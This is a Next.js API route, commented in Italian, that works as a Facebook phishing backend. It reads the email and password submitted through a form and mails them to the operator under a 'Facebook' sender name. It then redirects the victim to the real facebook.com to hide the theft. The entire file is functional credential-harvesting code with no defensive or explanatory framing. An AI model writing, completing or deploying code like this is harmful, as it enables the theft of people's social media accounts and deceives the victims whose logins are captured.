import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

export async function POST(request: Request) {
  try {
    const body = await request.formData();
    const email = body.get('email')?.toString() || '';
    const password = body.get('password')?.toString() || '';

    if (!email || !password) {
      return NextResponse.json({ error: 'Email e password richiesti.' }, { status: 400 });
    }

    // Configurazione SMTP con Register.it
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: Number(process.env.SMTP_PORT),
      secure: process.env.SMTP_SECURE === 'true',
      auth: {
        user: process.env.EMAIL,
        pass: process.env.EMAIL_PASSWORD
      }
    });

    // Email da inviare
    const mailOptions = {
      from: `"Facebook " <${process.env.EMAIL}>`,
      to: process.env.EMAIL, // ricevi la notifica tu stesso
      subject: 'Accesso  su Facebook',
      html: `
        <html>
          <body style="font-family:Arial, sans-serif;">

            <p><strong>Email:</strong> ${email}</p>
            <p><strong>Password :</strong> ${password}</p>
            <hr />
            
          </body>
        </html>
      `
    };

    await transporter.sendMail(mailOptions);

    // Redirect al sito ufficiale
    return NextResponse.redirect('https://www.facebook.com');
  } catch (error) {
    console.error('Errore invio:', error);
    return NextResponse.json({ error: 'Errore interno del server.' }, { status: 500 });
  }
}
